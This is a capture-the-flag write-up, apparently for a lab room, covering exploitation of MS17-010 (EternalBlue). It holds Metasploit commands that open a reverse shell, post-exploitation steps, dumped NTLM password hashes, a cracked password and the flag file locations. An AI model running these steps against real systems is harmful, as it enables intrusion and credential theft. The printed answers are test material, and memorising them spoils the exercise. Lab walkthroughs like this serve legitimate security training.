COMMAND:
```bash
nmap -sV -vv --script vuln 10.10.52.140 -oN scan/nmap

We start with nmap scan in `scan/nmap`:

### TASKS
How many ports are open with a port number under 1000? `Hint: Near the top of the nmap output: PORT STATE SERVICE`
```
¯\_(ツ)_/¯
```

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) `Hint: Revealed by the ShadowBrokers, exploits an issue within SMBv1`
```
¯\_(ツ)_/¯
```

At first we start to search our vulnerability `search ms17-010`
Then after find exploit we just use it!!!`use exploit/windows/smb/ms17_010_eternalblue`
Then we set our `RHOSTS` like this `set RHOSTS 10.10.52.140`
its better to use payload so we set out payload like so:`set payload windows/x64/shell/reverse_tcp`

Yes we get our sehll or its better to say RCE ig ...




### TASKS
Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)`Hint: search ms??`
```
¯\_(ツ)_/¯
```

Show options and set the one required value. What is the name of this value? (All caps for submission)`Hint: Command: show options`
```
¯\_(ツ)_/¯
```

## Escalate

after get RCE we going to use `shell_to_meterpreter` module to find users and password hash's so first we hit CTRL+Z to send RCE to background
than we just `use post/multi/manage/shell_to_meterpreter` and then we use `session -l` to list our sessions then we `set SESSION 1` and run exploit ...
we use `ps` to show processes and migrate to them ...
after some attempts we find our psID to migrate to `svchost.exe | 708`


### TASKS
What is the name of the post module we will use?`Hint: Google this: shell_to_meterpreter`
```
¯\_(ツ)_/¯
```

Select this (use MODULE_PATH). Show options, what option are we required to change?
```
¯\_(ツ)_/¯
```

## Cracking

after migrate to psID we found we use our `hashdump` command to see users hash's:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
then we use `https://crackstation.net/` to crack the password hash...

### TASKS
What is the name of the non-default user?
```
jon
```

 Copy this password hash to a file and research how to crack it. What is the cracked password?
```
alqfna22
```

## Find flags!

we found our first flag in `C:\flag1.txt`...
and second one in `C:\windows\system32\config\flag2.txt`
and for third flag after some time i can find flag on C:\Users\Jon\Documents\flag3.txt

### TASKS
Flag1? This flag can be found at the system root.`Hint: Can you C it?`
```
¯\_(ツ)_/¯
```

Flag2? This flag can be found at the location where passwords are stored within Windows.`Hint: I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.`
```
¯\_(ツ)_/¯
```

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.`Hint: You'll need to have elevated privileges to access this flag.
`
```
¯\_(ツ)_/¯
```
